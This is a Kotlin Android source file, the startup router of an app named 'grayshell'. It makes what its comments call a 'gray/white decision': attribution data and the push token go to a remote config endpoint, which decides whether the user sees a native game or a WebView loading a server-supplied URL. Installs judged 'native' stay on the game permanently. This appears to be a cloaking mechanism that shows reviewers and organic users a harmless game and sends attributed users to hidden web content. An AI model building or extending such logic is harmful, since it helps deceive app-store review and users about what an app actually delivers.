package com.example.grayshell.startup

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.example.grayshell.BuildConfig
import com.example.grayshell.Fullscreen
import com.example.grayshell.LoadingView
import com.example.grayshell.NativeContentActivity
import com.example.grayshell.blueprint.AppBlueprint
import com.example.grayshell.blueprint.ChannelResult
import com.example.grayshell.core.Trace
import com.example.grayshell.core.UrlGuard
import com.example.grayshell.core.UserAgent
import com.example.grayshell.portal.AlertPortal
import com.example.grayshell.portal.OfflinePortal
import com.example.grayshell.portal.StreamPortal
import com.example.grayshell.reach.ReachDispatch
import com.example.grayshell.signal.PushBus
import com.example.grayshell.vault.DataVault
import com.example.grayshell.vault.DataVault.RunChannel
import com.example.grayshell.wire.NetWire
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.util.Locale
import kotlin.coroutines.resume

/**
 * Entry-point router. Shows the branded loading screen while performing the
 * gray/white decision in the background. State machine — every branch below
 * is grounded in `.cursor/rules/kotlin_launch_flow.mdc`; changes need a read
 * there first.
 *
 *  UNDECIDED (first launch):
 *    * No internet → OfflinePortal on the first frame. Nothing started or
 *      persisted; the offline screen relaunches this router when the link
 *      returns.
 *    * Has internet → ignite AppsFlyer → attribution + deep link → config
 *      POST → decide.
 *      ok+url         → STREAM → optional AlertPortal → StreamPortal
 *      otherwise      → the native part, and persist NATIVE only when the
 *                       endpoint really answered AND the attribution was
 *                       non-empty.
 *
 *  STREAM (was WebView last time):
 *    * No internet → OfflinePortal with the saved URL.
 *    * Cold push URL → StreamPortal (highest priority).
 *    * Attribution → config POST.
 *      ok+url         → StreamPortal(newUrl)
 *      failure+saved  → StreamPortal(savedUrl)
 *      failure+none   → OfflinePortal
 *
 *  NATIVE (was the game last time):
 *    * The game, always. Once native, stay native — including if a push URL
 *      arrives for this install.
 */
class WelcomePortal : AppCompatActivity() {

    private lateinit var vault: DataVault
    private lateinit var wire: NetWire
    private var splash: LoadingView? = null
    private val scope = CoroutineScope(Dispatchers.Main)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        vault = DataVault(applicationContext)
        wire  = NetWire(applicationContext)

        val pushUrl = intent.takeIf { it.getBooleanExtra(EXTRA_FROM_PUSH, false) }
            ?.getStringExtra(EXTRA_PUSH_URL)
            ?.takeIf { it.isNotBlank() && UrlGuard.accepts(it) }

        // Warm-tap hand-off: the shell is still alive, take the user right back
        // to the page they were on and drop this splash entirely.
        if (pushUrl != null && vault.runChannel == RunChannel.STREAM &&
            PushBus.handOver(pushUrl)
        ) {
            Trace.i(TAG, "Warm push handed to the live shell")
            finish()
            return
        }

        // NATIVE users keep their game, regardless of what a push carries.
        if (vault.runChannel == RunChannel.NATIVE) {
            Trace.i(TAG, "Returning NATIVE — game, no attribution work")
            setContentView(LoadingView(this, indeterminate = true) {})
            Fullscreen.apply(this)
            scope.launch { goNative() }
            return
        }

        // Installed via a link with the radio off. Straight to the no-wifi
        // screen — no splash, no bar for a decision that will not be made.
        if (pushUrl == null &&
            vault.runChannel == RunChannel.UNDECIDED &&
            !wire.isConnected()
        ) {
            Trace.i(TAG, "First run with no link → offline first frame")
            startActivity(Intent(this, OfflinePortal::class.java))
            finish()
            return
        }

        val loader = LoadingView(this, indeterminate = true) { /* never auto-completes */ }
        splash = loader
        setContentView(loader)
        Fullscreen.apply(this)

        // Cold-start URL: STREAM channel already means WebView was the last
        // face of the app; UNDECIDED will become STREAM via route(). NATIVE
        // was handled above.
        if (pushUrl != null) {
            Trace.i(TAG, "Cold push URL received")
            vault.coldPushUrl = pushUrl
        }

        scope.launch { route() }
    }

    // ── State machine ───────────────────────────────────────────────────────

    private suspend fun route() {
        val forced = BuildConfig.DEBUG_FORCE_URL
        if (BuildConfig.DEBUG && forced.isNotBlank()) {
            Trace.w(TAG, "DEBUG: forcing stream URL")
            goGray(forced)
            return
        }

        val coldPush = vault.coldPushUrl
        if (!coldPush.isNullOrBlank() && UrlGuard.accepts(coldPush)) {
            Trace.i(TAG, "Cold push URL → STREAM directly")
            vault.coldPushUrl = null
            if (vault.runChannel == RunChannel.UNDECIDED)
                vault.runChannel = RunChannel.STREAM
            goGray(coldPush)
            return
        }

        when (vault.runChannel) {
            RunChannel.NATIVE   -> goNative()
            RunChannel.STREAM   -> handleOnlineReturn()
            RunChannel.UNDECIDED -> handleFirstLaunch()
        }
    }

    private suspend fun handleFirstLaunch() {
        if (!ensureInternet(isFirstLaunch = true)) return

        val tracker = (applicationContext as AppEntry).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionFirstMs)

        val result = fetchConfig(attribution)
        if (result.active && !result.destination.isNullOrBlank()) {
            vault.runChannel     = RunChannel.STREAM
            vault.destinationUrl = result.destination
            vault.urlExpiresAt   = result.expiresAt
            goGray(result.destination)
        } else {
            // A "no" sticks forever, so it has to be a real one — the endpoint
            // did answer, and it did with this install's attribution in hand.
            when {
                !result.answered ->
                    Trace.i(TAG, "endpoint unreachable → game, decision left open")
                attribution.isEmpty() ->
                    Trace.i(TAG, "no attribution behind the answer → game, decision left open")
                else -> {
                    vault.runChannel = RunChannel.NATIVE
                    Trace.i(TAG, "backend → NATIVE")
                }
            }
            goNative()
        }
    }

    private suspend fun handleOnlineReturn() {
        if (!ensureInternet(isFirstLaunch = false)) return

        val coldPush = vault.consumeColdPushUrl()
        if (!coldPush.isNullOrBlank() && UrlGuard.accepts(coldPush)) {
            goGray(coldPush)
            return
        }

        val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null

        val tracker = (applicationContext as AppEntry).trackingDispatch
        tracker.ignite(this)
        tracker.retrace(this)
        val attribution = tracker.awaitAttribution(AppBlueprint.attributionReturnMs)

        val result = fetchConfig(attribution)
        when {
            result.active && !result.destination.isNullOrBlank() -> {
                vault.destinationUrl = result.destination
                vault.urlExpiresAt   = result.expiresAt
                goGray(result.destination)
            }
            !savedUrl.isNullOrBlank() -> {
                goGray(savedUrl)
            }
            else -> handOver {
                startActivity(Intent(this, OfflinePortal::class.java))
                finish()
            }
        }
    }

    private suspend fun ensureInternet(isFirstLaunch: Boolean): Boolean {
        if (wire.isConnected()) return true

        // The old code left a collect on `wire.connectivityFlow` hanging past
        // the first `resume`. This variant hands ownership of a Job to the
        // suspended coroutine and cancels it on completion or cancellation.
        val gate = Channel<Boolean>(capacity = Channel.CONFLATED)
        val watcher: Job = scope.launch {
            wire.connectivityFlow.collect { ok -> gate.trySend(ok) }
        }
        val online = try {
            withTimeoutOrNull(AppBlueprint.connectGraceMs) {
                suspendCancellableCoroutine<Boolean> { cont ->
                    val listener = scope.launch {
                        for (v in gate) if (v) { cont.resume(true); break }
                    }
                    cont.invokeOnCancellation { listener.cancel() }
                }
            } == true
        } finally {
            watcher.cancel()
            gate.close()
        }
        if (online) return true

        val savedUrl = if (!isFirstLaunch && vault.isUrlValid()) vault.destinationUrl else null
        startActivity(
            Intent(this, OfflinePortal::class.java).apply {
                if (!savedUrl.isNullOrBlank())
                    putExtra(OfflinePortal.EXTRA_RETURN_URL, savedUrl)
            }
        )
        finish()
        return false
    }

    private suspend fun fetchConfig(attribution: Map<String, Any?>): ChannelResult {
        val tracker = (applicationContext as AppEntry).trackingDispatch
        val fcmToken = vault.fcmToken ?: getFcmToken()?.also { vault.fcmToken = it }

        val body = tracker.buildRequestBody(
            attributionData = attribution,
            os              = "Android",
            locale          = Locale.getDefault().toLanguageTag().replace('-', '_'),
            pushToken       = fcmToken,
            firebaseProject = AppBlueprint.resolveAnalyticsProject()
        )
        return ReachDispatch().fetchChannel(body)
    }

    // ── Navigation ──────────────────────────────────────────────────────────

    private fun handOver(go: () -> Unit) {
        val view = splash
        if (view == null) go() else view.complete { if (!isFinishing) go() }
    }

    private fun goNative() = handOver {
        startActivity(
            Intent(this, NativeContentActivity::class.java)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        finish()
    }

    private fun goGray(url: String) = handOver {
        val target = if (vault.shouldShowNotifScreen()) AlertPortal::class.java
                     else StreamPortal::class.java
        val extra = if (target == AlertPortal::class.java)
            AlertPortal.EXTRA_TARGET_URL else StreamPortal.EXTRA_STREAM_URL
        startActivity(
            Intent(this, target)
                .putExtra(extra, url)
                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        )
        finish()
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private suspend fun getFcmToken(): String? =
        withTimeoutOrNull(5_000L) {
            suspendCancellableCoroutine { cont ->
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (cont.isActive) cont.resume(if (task.isSuccessful) task.result else null)
                }
            }
        }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)?.takeIf { UrlGuard.accepts(it) }

        if (fromPush && !pushUrl.isNullOrBlank()) {
            when (vault.runChannel) {
                RunChannel.NATIVE -> {
                    Trace.i(TAG, "Push tap while NATIVE — game stays open")
                    return
                }
                RunChannel.STREAM -> {
                    if (PushBus.handOver(pushUrl)) {
                        finish()
                        return
                    }
                    val dest = vault.destinationUrl?.takeIf { vault.isUrlValid() }
                    startActivity(
                        Intent(this, StreamPortal::class.java)
                            .putExtra(StreamPortal.EXTRA_STREAM_URL, dest ?: pushUrl)
                            .putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
                            .putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
                            .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    )
                    finish()
                }
                RunChannel.UNDECIDED -> {
                    vault.coldPushUrl = pushUrl
                    setIntent(intent)
                }
            }
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }

    /** Present the current UA to callers who need to log it. */
    fun currentUserAgent(): String = UserAgent.value

    companion object {
        private const val TAG = "WelcomePortal"
        const val EXTRA_FROM_PUSH = "from_push"
        const val EXTRA_PUSH_URL  = "push_url"
    }
}
